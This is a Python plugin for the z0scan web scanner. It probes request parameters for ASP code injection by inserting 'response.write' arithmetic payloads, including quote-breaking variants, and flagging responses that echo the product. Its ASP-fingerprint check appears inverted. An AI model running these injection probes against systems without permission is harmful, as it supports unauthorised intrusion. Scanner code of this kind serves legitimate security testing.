#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2019/7/4
# JiuZero/z0scan

import random

from api import PluginBase, conf, VulType, generateResponse, Type, logger, Threads, PLACE, KB


class Z0SCAN(PluginBase):
    name = "codei-asp"
    desc = 'ASP Code Execution'
    version = "2025.5.15"
    risk = 3
        
    def audit(self):
        if conf.level == 0 or self.fingerprints.waf:
            return
        if not "ASP" in self.fingerprints.finger:
            randint1 = random.randint(10000, 90000)
            randint2 = random.randint(10000, 90000)
            randint3 = randint1 * randint2
            _payloads = [
                'response.write({}*{})'.format(randint1, randint2),
                '\'+response.write({}*{})+\''.format(randint1, randint2),
                '"response.write({}*{})+"'.format(randint1, randint2),
            ]
            
            iterdatas = self.generateItemdatas()
            z0thread = Threads(name="codei-asp")
            z0thread.submit(self.process, iterdatas, _payloads, randint3)
                    
    def process(self, _, _payloads, randint3):
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return
        for _payload in _payloads:
            payload = self.insertPayload({
                "key": k,
                "payload": _payload, 
                "position": position, 
                })
            r = self.req(position, payload)
            if not r:
                continue
            html = r.text
            if str(randint3) in html:
                result = self.generate_result()
                result.main({
                    "type": Type.REQUEST, 
                    "url": r.url, 
                    "vultype": VulType.CODE_INNJECTION, 
                    "show": {
                        "Position": f"{position} >> {k}", 
                        "Payload": payload, 
                        }
                    })
                result.step("Request1", {
                    "request": r.reqinfo, 
                    "response": generateResponse(r), 
                    "desc": "Match Int {}".format(randint3)
                    })
                self.success(result)
                return True
    